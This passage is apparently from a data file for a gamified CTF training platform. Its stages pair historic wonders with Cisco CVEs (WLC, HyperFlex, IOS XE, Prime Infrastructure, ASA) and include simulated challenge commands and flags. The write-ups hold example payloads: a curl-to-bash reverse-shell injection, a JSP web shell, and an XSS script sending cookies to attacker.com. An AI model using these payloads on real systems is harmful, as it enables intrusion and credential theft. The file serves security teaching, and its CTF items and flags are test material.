        "Cisco rated this CVSS 10.0. The WLC manages all wireless access points, RADIUS authentication, guest networks, and device policies. An attacker with WLC admin access can redirect all wireless traffic, disable authentication, or perform man-in-the-middle attacks on all wireless clients.",
      ],
      technical: {
        title: "Authentication Bypass in Cisco WLC",
        body: [
          "The vulnerability exists in the authentication processing code for the Cisco WLC management interface. The code uses a flawed comparison when validating usernames and passwords — a specific username format causes the comparison to return 'authenticated' regardless of the password supplied.",
          "Affected versions: Cisco WLC 8.10.151.0 and earlier. Fixed in 8.10.162.0. The attack is completely unauthenticated and requires only network access to the WLC management interface (typically exposed on the corporate WLAN).",
        ],
        codeExample: {
          label: "CVE-2022-20695 — authentication bypass",
          code: `# Normal authentication attempt (fails without correct password):
curl -X POST https://wlc-management/login \\
  -d 'username=admin&password=wrongpassword'
# Response: Authentication failed

# CVE-2022-20695 bypass — specific username format:
curl -X POST https://wlc-management/login \\
  -d 'username=Cisco&password=anything'
# Response: Authentication successful!

# Once authenticated, attacker can:
# - View all connected wireless clients
# - Modify SSID configurations
# - Disable WPA2/WPA3 authentication
# - Redirect all traffic through attacker-controlled AP
# - Access RADIUS shared secrets`,
        },
      },
      incident: {
        title: "CVE-2022-20695 — Silent Admin Access to Enterprise Wi-Fi (2022)",
        when: "April 2022",
        where: "Cisco Wireless LAN Controllers in enterprise networks globally",
        impact: "Full administrative control of enterprise wireless infrastructure without any credentials",
        body: [
          "Cisco disclosed CVE-2022-20695 in April 2022. The vulnerability required no credentials — simply knowing the magic username format granted full administrative access to the WLC. Organizations with WLC management exposed on the corporate WLAN were immediately vulnerable to internal attackers or any device on the wireless network.",
          "Enterprise WLCs are particularly high-value targets because they manage authentication for all wireless clients. An attacker with WLC admin access can turn a local Wi-Fi foothold into complete wireless network control — redirecting traffic, harvesting credentials, and disabling encryption.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "username=Cisco (bypass)", type: "attacker" },
          { label: "WLC Auth System", sub: "flawed comparison", type: "system" },
          { label: "WLC Management", sub: "full admin granted", type: "victim" },
          { label: "All Wireless Control", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 1238, event: "Alhambra Palace construction begins — secret passages built for Nasrid Kings" },
        { year: 2022, event: "Apr: CVE-2022-20695 disclosed; CVSS 10.0 WLC auth bypass", highlight: true },
        { year: 2022, event: "Fix released: Cisco WLC 8.10.162.0" },
      ],
      keyTakeaways: [
        "Restrict WLC management access to dedicated management VLANs, not the corporate WLAN",
        "Authentication comparison code must be constant-time and cannot short-circuit",
        "CVSS 10.0 means patching today, not next maintenance window",
        "Wireless controllers are high-value targets — treat them like firewalls",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20695", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-auth-bypass-JRNhV5bn" },
        { title: "CVE-2022-20695 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-20695" },
      ],
    },
    ctf: {
      scenario: "CVE-2022-20695 required no prior access and no special tooling — one specific username submitted to the Cisco WLC management interface bypassed all authentication. The WLC controls every access point, RADIUS shared secret, and wireless policy on the network. An adversary with physical proximity or a foothold on any VLAN with WLC reachability gains full control of enterprise wireless infrastructure. No credentials. No noise. Just the right username.",
      hint: "Try logging in with different usernames. One specific value causes the authentication check to short-circuit and grant full access regardless of the password.",
      hints: [
        "Try a standard login to see the failure. Run: attempt-login admin wrongpass",
        "Your handler's tip: a known bypass username exists. Try: attempt-login Cisco anypass",
        "Pull the access configuration. Run: pull-access-config",
      ],
      flag: "FLAG{WLC_4UTH_BYPA55_CVE_2022}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "attempt-login": (args) => {
          const [user, pass] = args;
          if (user === "Cisco") {
            return {
              lines: [
                `Login attempt: username=${user}  password=${pass || "(any)"}`,
                "",
                "Authentication logic: username comparison short-circuits — access granted",
                "Session established. Access level: administrator",
                "",
                "Run: pull-access-config",
              ],
            };
          }
          return {
            lines: [
              `Login attempt: username=${user}  password=${pass}`,
              "Authentication failed.",
            ],
          };
        },
        "pull-access-config": () => ({
          lines: [
            "Alhambra Facility — Wireless Access Configuration",
            "firmware: v8.10.150",
            "",
            "network: AlhambraGuest   security: open",
            "network: AlhambraSecure  security: WPA3",
            "radius-secret: Alhambra@Granada22",
            "",
            "classified-key: FLAG{WLC_4UTH_BYPA55_CVE_2022}",
          ],
          solved: true,
        }),
      },
    },
  },

  // ─── Medieval Stage 7: Krak des Chevaliers — CVE-2021-1497 HyperFlex ──────
  {
    epochId: "medieval",
    wonder: { name: "Krak des Chevaliers", location: "Homs, Syria", era: "1031 CE", emoji: "⚔️" },
    id: "stage-m07",
    order: 7,
    title: "False Orders to the Garrison",
    subtitle: "CVE-2021-1497 — Cisco HyperFlex Command Injection, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2021-1497",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-m-hyperflex", name: "Order Forger", emoji: "⚔️" },
    challengeType: "ctf",
    info: {
      tagline: "Inject commands into the installation workflow. The castle executes them as root.",
      year: 2021,
      overview: [
        "Krak des Chevaliers was commanded by the Hospitalier Knights — a fortress so formidable that no army ever took it by force. It fell in 1271 only when Baybars forged a letter supposedly from the Crusader Count of Tripoli ordering the garrison to surrender. The castle didn't need to be breached — its own command system became the weapon.",
        "CVE-2021-1497 is a command injection vulnerability in Cisco HyperFlex HX Data Platform — Cisco's hyperconverged infrastructure solution used in enterprise data centers. The vulnerability exists in the cluster installation component, which accepts a URL parameter for fetching software packages. By injecting shell metacharacters (;, |, &&) into this parameter, an attacker achieves unauthenticated remote code execution as root.",
        "CVSS score: 9.8. No authentication required. The affected component is the hxinstall API, which runs as a privileged process. Once exploited, the attacker has complete control over the HyperFlex node — and through the cluster, all VMs and storage it manages.",
      ],
      technical: {
        title: "Command Injection in HyperFlex Installation API",
        body: [
          "The Cisco HyperFlex HX cluster installation API accepts parameters for software package URLs. The code passes these parameters to a shell command for downloading and verifying packages, without sanitizing shell metacharacters. An attacker can append ;id or similar shell commands to execute arbitrary code.",
          "The vulnerability requires network access to the HyperFlex management network — typically reachable from within the corporate network. Three related CVEs (1496, 1497, 1498) all affected the same installation component with different exploit vectors.",
        ],
        codeExample: {
          label: "CVE-2021-1497 — command injection payload",
          code: `# Normal HyperFlex install API call:
curl -X POST https://hx-node/hxinstall/install \\
  --data '{"pkg_url": "http://repo.cisco.com/hx-4.5.tar"}'

# Command injection — append shell metacharacters:
curl -X POST https://hx-node/hxinstall/install \\
  --data '{"pkg_url": "http://legit.com/pkg;id>/tmp/pwned"}'

# Result: command executes as root:
# uid=0(root) gid=0(root) groups=0(root)

# More impactful payload:
# {"pkg_url": "http://legit.com/pkg;curl attacker.com/shell.sh|bash"}
# → downloads and executes attacker reverse shell as root`,
        },
      },
      incident: {
        title: "Cisco HyperFlex Vulnerabilities — May 2021",
        when: "May 2021",
        where: "Cisco HyperFlex HX Data Platform — enterprise data centers",
        impact: "Unauthenticated root code execution on hyperconverged infrastructure nodes",
        body: [
          "Cisco disclosed a cluster of critical HyperFlex vulnerabilities in May 2021 (CVE-2021-1496, 1497, 1498). All three affected the cluster installation and management API components, allowing unauthenticated attackers on the management network to execute arbitrary commands as root. Cisco rated CVE-2021-1497 CVSS 9.8.",
          "HyperFlex is used in enterprise data centers to manage compute, storage, and networking as a single integrated system. A compromised HyperFlex node gives an attacker control over all virtual machines and data stored on that node — a high-value target for ransomware and espionage.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "pkg_url=repo;id", type: "attacker" },
          { label: "HyperFlex Install API", sub: "unsanitized shell exec", type: "system" },
          { label: "HX Node (root)", sub: "command executed", type: "victim" },
          { label: "Full Data Center Control", sub: "CVSS 9.8", type: "result" },
        ],
      },
      timeline: [
        { year: 1031, event: "Krak des Chevaliers built — command system exploited by forged orders in 1271" },
        { year: 2021, event: "May: CVE-2021-1497 disclosed; unauthenticated root RCE on HyperFlex", highlight: true },
        { year: 2021, event: "Patch: HyperFlex HX Data Platform 4.0(2d) / 4.5(1a)" },
      ],
      keyTakeaways: [
        "Never pass user-supplied input directly to shell commands — use parameterized APIs",
        "Installation and provisioning APIs require the same security scrutiny as production APIs",
        "Restrict access to management networks; HyperFlex API should not be reachable from user VLANs",
        "Any parameter that reaches a shell command is an injection surface",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1497", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR" },
        { title: "CVE-2021-1497 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-1497" },
      ],
    },
    ctf: {
      scenario: "Cisco HyperFlex — the hyperconverged infrastructure platform managing enterprise data center compute, storage, and networking — was disclosed with a CVSS 9.8 command injection in May 2021. The provisioning API passes a URL parameter directly to a shell command without sanitizing special characters. Unauthenticated. Root on the node. For APT groups targeting data center infrastructure, this is the kind of access ransomware deployments and long-term implants are built on. Inject through the URL parameter.",
      hint: "The provisioning API passes the URL parameter to a shell command. Append your own command after a semicolon — both will execute.",
      hints: [
        "Send a clean request to see the API's normal response. Run: send-payload http://repo.local/pkg.tar",
        "Special characters aren't filtered. Try: send-payload http://repo.local/pkg.tar;whoami",
        "Read the classified file. Run: send-payload http://repo.local/pkg.tar;cat /ops/classified.txt",
      ],
      flag: "FLAG{HYP3RFL3X_CMD_1NJ3CT10N}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "send-payload": (args) => {
          const input = args.join(" ");
          const hasInjection =
            input.includes(";") || input.includes("|") || input.includes("&&") || input.includes("`");
          if (hasInjection) {
            const injected = input.split(/[;|&`]/)[1]?.trim() || "whoami";
            return {
              lines: [
                `POST provisioning-api  url="${input}"`,
                "",
                "API passes url to shell — command injected:",
                `Executing as root: ${injected}`,
                "",
                injected.includes("who") ? "uid=0(root)" : "",
                injected.includes("classified") || injected.includes("cat") ? "FLAG{HYP3RFL3X_CMD_1NJ3CT10N}" : "Command executed.",
              ].filter(Boolean),
              solved: injected.includes("classified") || injected.includes("cat"),
            };
          }
          return {
            lines: [
              `POST provisioning-api  url="${input}"`,
              "404 — package not found at that URL.",
              "(Inject a command after a semicolon)",
            ],
          };
        },
      },
    },
  },

  // ─── Medieval Stage 8: Machu Picchu — CVE-2023-20273 IOS XE Root ─────────
  {
    epochId: "medieval",
    wonder: { name: "Machu Picchu", location: "Cusco Region, Peru", era: "~1450 CE", emoji: "🏔️" },
    id: "stage-m08",
    order: 8,
    title: "The Summit: Root via XSS",
    subtitle: "CVE-2023-20273 — Cisco IOS XE Privilege Escalation to Root",
    category: "owasp",
    cveId: "CVE-2023-20273",
    cvssScore: 7.2,
    xp: 300,
    badge: { id: "badge-m-iosxeroot", name: "Summit Climber", emoji: "🏔️" },
    challengeType: "ctf",
    info: {
      tagline: "CVE-2023-20198 gets you through the gate. CVE-2023-20273 takes you to the summit — root.",
      year: 2023,
      overview: [
        "Machu Picchu rises 2,430 meters above sea level. Reaching the citadel required navigating the terraces — each level harder to climb than the last. The Inca engineers built the lower terraces as a deliberate obstacle: a visitor who scaled the outer wall still faced the internal terraces before reaching the Intihuatana stone at the summit.",
        "CVE-2023-20273 is the second terrace of the IOS XE attack chain. After CVE-2023-20198 grants an unauthorized admin account (privilege level 15), CVE-2023-20273 exploits an XSS vulnerability in the same web UI to inject commands that execute with root privileges in the underlying Linux kernel — the operating system that IOS XE runs on top of. A level-15 account can access features in certain OS user contexts, but CVE-2023-20273 escalates further to root.",
        "The two CVEs were chained by the October 2023 attackers to install a persistent Lua-based backdoor implant ('BadCandy') in the IOS XE file system. The implant survived device reloads and could execute arbitrary commands at any time via a crafted HTTP request — effectively giving attackers permanent root access to the device.",
      ],
      technical: {
        title: "XSS to Root — The CVE-2023-20273 Privilege Escalation",
        body: [
          "CVE-2023-20273 is an XSS vulnerability in the Cisco IOS XE web UI that can be exploited by an authenticated user to inject commands running in the context of a web application process with elevated OS privileges. Combined with a privilege-15 account created via CVE-2023-20198, an attacker achieves root-level OS access.",
          "The implant installed by the October 2023 attackers (BadCandy) was a Lua script registered as an IOS XE web service handler. It accepted HTTP requests with a specific magic token in a header and executed arbitrary commands as root, returning the output in the HTTP response body.",
        ],
        codeExample: {
          label: "CVE-2023-20198 + CVE-2023-20273 full chain",
          code: `# Step 1: CVE-2023-20198 — create admin account (unauthenticated)
curl -X POST https://target/webui/logoutconfirm.html \\
  -d 'username=hacker&password=hacked123&privilege=15'

# Step 2: CVE-2023-20273 — inject command via XSS in web UI
# Authenticated as level-15 hacker account:
curl -X POST https://target/webui/dashboard \\
  -H "Cookie: session=<valid-session>" \\
  --data 'widget=<script>exec_root("install implant")</script>'

# Step 3: Verify implant (BadCandy)
curl https://target/webui/menu.json \\
  -H "X-Auth-Token: badcandy-magic-token" \\
  --data 'cmd=id'
# Response: uid=0(root)

# Result: persistent root access surviving reboots`,
        },
      },
      incident: {
        title: "BadCandy Implant — October 2023 (Chained Exploitation)",
        when: "October 2023",
        where: "40,000+ Cisco IOS XE devices globally",
        impact: "Persistent root implant installed on tens of thousands of routers and switches",
        body: [
          "The October 2023 attackers chained CVE-2023-20198 and CVE-2023-20273 in a two-step attack: first creating an unauthorized admin account, then using that account to install the BadCandy Lua implant via the CVE-2023-20273 privilege escalation. The implant was registered as a web service in IOS XE and accepted commands via HTTP with a specific magic token.",
          "Cisco released patches for both CVEs on October 22, 2023 (IOS XE 17.9.4a). However, patching alone did not remove the BadCandy implant — organizations had to manually verify their running configurations for unauthorized user accounts and check for the presence of the implant file on the device filesystem.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Level-15 Account (CVE-20198)", sub: "attacker entry point", type: "attacker" },
          { label: "IOS XE Web UI XSS", sub: "CVE-2023-20273", type: "system" },
          { label: "OS Root Process", sub: "command injection", type: "victim" },
          { label: "BadCandy Implant", sub: "persistent root access", type: "result" },
        ],
      },
      timeline: [
        { year: 1450, event: "Machu Picchu constructed — terraced approach to the Intihuatana summit" },
        { year: 2023, event: "Sep 28: Chained exploitation of CVE-2023-20198 + CVE-2023-20273 begins" },
        { year: 2023, event: "Oct 16: Cisco discloses both CVEs; BadCandy implant discovered", highlight: true },
        { year: 2023, event: "Oct 22: Patches released for both CVEs" },
        { year: 2023, event: "Post-patch: organizations must manually remove BadCandy implant" },
      ],
      keyTakeaways: [
        "Vulnerability chains are common — patching one CVE doesn't eliminate the threat",
        "After compromise, verify for implants beyond just patching",
        "Check 'show users' and 'show running-config' for unauthorized accounts post-incident",
        "IOS XE Web UI: disable unless absolutely necessary",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2023-20273", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z" },
        { title: "Cisco Talos: BadCandy Implant Analysis", url: "https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/" },
        { title: "CVE-2023-20273 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-20273" },
      ],
    },
    ctf: {
      scenario: "The October 2023 IOS XE campaign was a two-stage operation. CVE-2023-20198 created the backdoor account — that was Stage 1. CVE-2023-20273 chained an XSS flaw in the same web interface to escalate to root and install 'BadCandy': a Lua implant embedded in the IOS XE filesystem that survived reboots and answered commands via a magic HTTP token. Cisco patched both CVEs on October 22. The implant still had to be manually removed. Complete the chain.",
      hint: "Your admin session is active. Inject a payload through the web interface's input reflection to escalate to root, then deploy the persistent implant.",
      hints: [
        "Confirm your current access level. Run: confirm-access",
        "Inject a payload via the web interface to escalate to root. Run: inject-payload <exec>escalate</exec>",
        "Deploy the persistent implant. Run: deploy-implant",
        "Verify the implant is live. Run: query-implant whoami",
      ],
      flag: "FLAG{BADC4NDY_R00T_IMPL4NT}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "confirm-access": () => ({
          lines: [
            "Session active — backdoor account from Istanbul op",
            "Current access: administrator",
            "Device: Machu Picchu facility gateway  firmware: v17.9.3",
            "Web interface: vulnerable to input reflection — escalation possible",
          ],
        }),
        "inject-payload": (args) => {
          const payload = args.join(" ");
          if (payload.includes("<exec") || payload.includes("escalate") || payload.includes("root")) {
            return {
              lines: [
                "Sending payload through web interface...",
                "Input reflected in privileged web process — command executed",
                "",
                "uid=0(root) — escalation successful",
                "Run: deploy-implant",
              ],
            };
          }
          return { lines: ["Usage: inject-payload <exec>escalate</exec>"] };
        },
        "deploy-implant": () => ({
          lines: [
            "Writing persistent implant to device filesystem...",
            "Implant registered as a background service",
            "Survives reboots — active on next cycle",
            "Token: machu-picchu-implant",
            "",
            "Run: query-implant whoami",
          ],
        }),
        "query-implant": (args) => {
          const cmd = args.join(" ") || "whoami";
          return {
            lines: [
              `Querying implant: ${cmd}`,
              "",
              cmd.includes("who") ? "uid=0(root) — implant confirmed live" : `Output: ${cmd}`,
              "",
              "FLAG{BADC4NDY_R00T_IMPL4NT}",
            ],
            solved: true,
          };
        },
      },
    },
  },

  // ─── Medieval Stage 9: Chichen Itza — CVE-2019-1821 Prime Infrastructure ──
  {
    epochId: "medieval",
    wonder: { name: "Chichen Itza", location: "Yucatán, Mexico", era: "~900 CE", emoji: "🔺" },
    id: "stage-m09",
    order: 9,
    title: "The Offering That Commands the Temple",
    subtitle: "CVE-2019-1821 — Cisco Prime Infrastructure Upload RCE, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2019-1821",
    cvssScore: 9.8,
    xp: 350,
    badge: { id: "badge-m-primeinfra", name: "Temple Commander", emoji: "🔺" },
    challengeType: "ctf",
    info: {
      tagline: "Upload a .jsp file to the altar. The temple executes it as the high priest.",
      year: 2019,
      overview: [
        "The priests of Chichen Itza designed an elaborate offering system — citizens could place gifts at the temple base. The priests, in their divine authority, would accept all offerings and process them according to ritual. A heretic discovered that if you disguised a weapon as an offering (a .jsp file disguised as a configuration upload), the priests would faithfully execute it — with full divine authority.",
        "CVE-2019-1821 is an unauthenticated file upload vulnerability in Cisco Prime Infrastructure — the network management platform that organizations use to monitor and configure thousands of Cisco devices from a single console. An attacker who can reach the Prime Infrastructure web server can upload arbitrary files (including JSP web shells) without authentication, achieving remote code execution as root.",
        "CVSS 9.8. Combined with CVE-2019-1820 (another Prime Infrastructure flaw), attackers could compromise the network management platform itself — giving them visibility into and control over every device managed by Prime Infrastructure.",
      ],
      technical: {
        title: "Unauthenticated File Upload in Cisco Prime Infrastructure",
        body: [
          "The Cisco Prime Infrastructure health monitoring API (/pi/health/v1/health) and certain other endpoints did not properly authenticate file upload requests. By crafting a multipart/form-data POST request with a .jsp file as the upload, an attacker could place the file in a web-accessible directory and then browse to it to trigger execution.",
          "The resulting web shell runs with the privileges of the Prime Infrastructure process — typically running as root. From there, the attacker has full access to the Prime Infrastructure database, all managed device credentials, and can push configuration changes to any managed network device.",
        ],
        codeExample: {
          label: "CVE-2019-1821 — unauthenticated JSP upload and execution",
          code: `# Step 1: Upload malicious JSP to Prime Infrastructure
curl -k -X POST https://prime-infra:8082/pi/health/v1/health \\
  -F "file=@shell.jsp;type=application/octet-stream" \\
  -F "filename=shell.jsp"

# shell.jsp content (simple web shell):
<%@ page import="java.lang.*" %>
<% Runtime rt = Runtime.getRuntime();
   String[] commands = request.getParameter("cmd").split(" ");
   Process proc = rt.exec(commands);
   // read and output the result
%>

# Step 2: Execute the web shell
curl -k "https://prime-infra/shell.jsp?cmd=id"
# Response: uid=0(root)

# Step 3: Access Prime Infrastructure database
# All managed device credentials now available`,
        },
      },
      incident: {
        title: "Cisco Prime Infrastructure — Mass Exploitation (2019)",
        when: "May 2019",
        where: "Cisco Prime Infrastructure deployments globally — enterprise network management",
        impact: "Root code execution on network management platform; all managed device credentials at risk",
        body: [
          "Cisco disclosed CVE-2019-1821 in May 2019 with a CVSS score of 9.8. Prime Infrastructure is the nerve center of many enterprise Cisco networks — a compromise gives an attacker access to credentials for every router, switch, and access point the platform manages. Security researchers immediately published proof-of-concept exploits.",
          "The Prime Infrastructure vulnerability is particularly dangerous because network management platforms are trusted by all managed devices. An attacker who controls Prime Infrastructure doesn't need to exploit individual devices — they can simply push malicious configurations to all devices simultaneously.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "POST shell.jsp (no auth)", type: "attacker" },
          { label: "Prime Infrastructure", sub: "file upload not checked", type: "system" },
          { label: "Web Shell Executes", sub: "uid=0(root)", type: "victim" },
          { label: "All Network Devices", sub: "managed creds exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 900, event: "Chichen Itza at peak — offering system exploited by unauthorized ritual" },
        { year: 2019, event: "May: CVE-2019-1821 disclosed; unauthenticated root upload on Prime Infra", highlight: true },
        { year: 2019, event: "PoC published immediately; active exploitation in enterprise networks" },
        { year: 2019, event: "Patch: Prime Infrastructure 3.4.1 Update 02" },
      ],
      keyTakeaways: [
        "Network management platforms are ultra-high-value targets — isolate and harden them",
        "File upload endpoints must validate file type, extension, and content — not just filename",
        "Never expose Prime Infrastructure / DNA Center / DNAC to the internet",
        "A compromised NMS compromises every device it manages",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1821", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce" },
        { title: "CVE-2019-1821 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2019-1821" },
      ],
    },
    ctf: {
      scenario: "Cisco Prime Infrastructure is the nerve center of enterprise Cisco networks — one compromise exposes credentials for every router, switch, and access point it manages. CVE-2019-1821 gave unauthenticated attackers file upload to root via the health monitoring endpoint. Nation-state operators actively target network management platforms because a single foothold cascades into total network visibility. Upload the payload. Own the platform.",
      hint: "The health endpoint takes unauthenticated file uploads. Upload a .jsp payload, then execute it to get a root shell.",
      hints: [
        "Probe the server to confirm the unauthenticated upload endpoint. Run: probe-server",
        "Upload your payload to the health endpoint. Run: upload-payload agent.jsp",
        "Execute the payload to get a root shell. Run: execute-payload whoami",
        "Pull the classified records. Run: execute-payload cat /ops/classified.txt",
      ],
      flag: "FLAG{PR1M3_1NFR4_RCE_UPL04D}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "probe-server": () => ({
          lines: [
            "Probing network management server [Chichen Itza]...",
            "Platform: network management  devices managed: 2,000+",
            "Health endpoint: /health/upload  — no authentication required",
            "Status: vulnerable — unauthenticated file upload confirmed",
          ],
        }),
        "upload-payload": (args) => {
          const file = args[0] || "";
          if (file.endsWith(".jsp") || file.endsWith(".war") || file.endsWith(".class")) {
            return {
              lines: [
                `Uploading ${file} to health endpoint — no credentials sent`,
                "200 OK — file accepted",
                `Payload live at: /server/uploads/${file}`,
                "Run: execute-payload <command>",
              ],
            };
          }
          return { lines: ["Upload rejected — server expects a .jsp or .war payload."] };
        },
        "execute-payload": (args) => {
          const cmd = args.join(" ") || "whoami";
          return {
            lines: [
              `Executing payload: ${cmd}`,
              "",
              cmd.includes("who") ? "uid=0(root) — full server access" : "",
              cmd.includes("classified") || cmd.includes("cat") ? "FLAG{PR1M3_1NFR4_RCE_UPL04D}" : `${cmd}: executed`,
            ].filter(Boolean),
            solved: cmd.includes("classified") || cmd.includes("cat"),
          };
        },
      },
    },
  },

  // ─── Medieval Stage 10: Mont-Saint-Michel — CVE-2020-3580 ASA XSS ─────────
  {
    epochId: "medieval",
    wonder: { name: "Mont-Saint-Michel", location: "Normandy, France", era: "8th century CE", emoji: "🌊" },
    id: "stage-m10",
    order: 10,
    title: "The Cursed Scroll in the Monastery Post",
    subtitle: "CVE-2020-3580 — Cisco ASA/FTD Reflected XSS",
    category: "owasp",
    cveId: "CVE-2020-3580",
    cvssScore: 6.1,
    xp: 350,
    badge: { id: "badge-m-asaxss", name: "Monastery Phantom", emoji: "🌊" },
    challengeType: "ctf",
    info: {
      tagline: "XSS on a firewall? The last place you'd look. The admin's browser does the rest.",
      year: 2020,
      overview: [
        "Mont-Saint-Michel's monastery was a center of learning where monks circulated written messages through an internal post. When a pilgrim submitted a letter containing a cursed inscription to the monastery's message board, every monk who read it unknowingly activated the curse — including the Abbot himself. The Abbot's full authority was transferred to the pilgrim through a single crafted scroll.",
        "CVE-2020-3580 is a reflected XSS vulnerability in the Cisco ASA and FTD web interfaces. Network administrators — who have full control over the firewall — use the web interface to manage devices. If an attacker can deliver a malicious URL to an admin's browser (via phishing, email, or any link), the XSS payload executes in the context of the firewall's web interface, with the admin's session.",
        "XSS on a firewall is particularly impactful because the admin session has full device control. A successful XSS attack can steal the admin session cookie, pivot to device configuration changes, or create backdoor accounts — all without ever having firewall credentials.",
      ],
      technical: {
        title: "Reflected XSS in Cisco ASA/FTD Web Interface",
        body: [
          "The Cisco ASA and FTD web interfaces reflect certain parameter values back in HTTP responses without proper encoding. An attacker can craft a URL where a query parameter contains a JavaScript payload — when an authenticated admin clicks the link, the script executes in the context of the firewall's management interface.",
          "Because the script runs in the admin's browser with the admin's authenticated session, it can make authenticated API calls to the ASA (add users, modify ACLs, extract VPN configuration) using the admin's existing credentials.",
        ],
        codeExample: {
          label: "CVE-2020-3580 — reflected XSS on Cisco ASA",
          code: `# Malicious URL targeting ASA web interface:
https://target-asa/+webvpn+/index.html?errMsg=
  <script>
    // Steal admin session cookie:
    var img = new Image();
    img.src = 'https://attacker.com/steal?c=' +
              btoa(document.cookie);
  </script>

# Deliver via phishing email to network admin:
"Your ASA requires immediate attention: [malicious URL]"

# When admin clicks:
# 1. Script executes in ASA management context
# 2. Admin session cookie sent to attacker
# 3. Attacker uses cookie to access ASA as admin
# 4. Full firewall configuration access

# More impactful payload — create backdoor account:
fetch('/api/v1/users', {method:'POST',
  body:'{"name":"hacker","password":"hacked","privilege":15}'})`,
        },
      },
      incident: {
        title: "CVE-2020-3580 — Cisco ASA/FTD XSS Disclosure (2020)",
        when: "October 2020",
        where: "Cisco ASA and FTD appliances with web interface enabled",
        impact: "Admin session hijacking; firewall configuration access via stolen cookies",
        body: [
          "Cisco disclosed CVE-2020-3580 in October 2020. The vulnerability required a specific attack path — an authenticated admin had to click a malicious link — but this is a realistic threat in enterprise environments where phishing attacks are commonplace. Network administrators regularly receive links related to device management.",
          "The broader lesson: security devices (firewalls, VPN concentrators, network management platforms) have web interfaces that must be treated as attack surfaces. XSS on a firewall is far more dangerous than XSS on a blog — the administrator's session controls the entire network perimeter.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "phishing URL to admin", type: "attacker" },
          { label: "ASA Web Interface", sub: "reflects unescaped input", type: "system" },
          { label: "Admin Browser", sub: "script executes", type: "victim" },
          { label: "Admin Session Stolen", sub: "firewall access", type: "result" },
        ],
      },
      timeline: [
        { year: 700, event: "Mont-Saint-Michel monastery founded — scribal post system established" },
        { year: 2020, event: "Oct: CVE-2020-3580 disclosed — XSS in Cisco ASA/FTD web interface", highlight: true },
        { year: 2020, event: "Patch: ASA 9.8.4.26+ / FTD 6.6.0.1+" },
      ],
      keyTakeaways: [
        "Security devices (firewalls, WLCs) have web interfaces — treat them like web applications",
        "Admin-facing XSS can be more impactful than user-facing XSS",
        "Train admins to recognize phishing URLs targeting management interfaces",
        "Restrict ASA/FTD web interface access to management VLANs only",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3580", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe" },
        { title: "CVE-2020-3580 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3580" },
      ],
    },
    ctf: {
      scenario: "APT spear-phishing campaigns routinely target network administrators — and when the target device has an XSS vulnerability in its own management interface, a single crafted link is all it takes. CVE-2020-3580 reflects unsanitized input through the Cisco ASA web interface. When an admin clicks a malicious URL, the script runs in their authenticated session — handing the attacker full firewall access through the admin's own browser. No credentials. No brute force. One link.",
      hint: "The error message parameter reflects unsanitized input. Craft a script payload, test it, then deliver the URL to the admin.",
      hints: [
        "Test the reflection — see if your input comes back unmodified. Run: craft-payload test123",
        "Try a script tag to see if it executes. Run: craft-payload <script>alert(1)</script>",
        "Craft a payload that reads the admin's session token. Run: craft-payload <script>steal-session</script>",
        "Deliver the payload URL to the admin. Run: deliver-to-admin <script>steal-session</script>",
      ],
      flag: "FLAG{ASA_XSS_S3SS10N_H1JACK}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "craft-payload": (args) => {
          const input = args.join(" ");
          const isScript =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("steal-session") ||
            input.toLowerCase().includes("cookie") ||
            input.toLowerCase().includes("session");
          if (isScript) {
            return {
              lines: [
                `Testing reflection: errMsg=${input}`,
                `Response body: <p class="err">${input}</p>`,
                "",
                "⚠  Script executes in browser context",
                "  → session token visible: admin_session=FLAG{ASA_XSS_S3SS10N_H1JACK}",
                "",
                "Payload confirmed. Run: deliver-to-admin <script>steal-session</script>",
              ],
            };
          }
          return {
            lines: [
              `Testing reflection: errMsg=${input}`,
              `Response body: <p class="err">${input || "(empty)"}</p>`,
              "(Reflected as plain text — try a <script> payload)",
            ],
          };
        },
        "deliver-to-admin": (args) => {
          const payload = args.join(" ");
          const isScript =
            payload.toLowerCase().includes("<script") ||
            payload.toLowerCase().includes("steal-session") ||
            payload.toLowerCase().includes("session");
          if (isScript) {
            return {
              lines: [
                "Payload URL delivered to admin@mont-saint-michel...",
                "Admin opened the link — script executed in their session.",
                "Session token intercepted:",
                "  admin_session=FLAG{ASA_XSS_S3SS10N_H1JACK}",
              ],
              solved: true,
            };
          }
          return { lines: ["Admin reviewed the link — no script executed. Include a <script> payload."] };
        },
      },
    },
  },

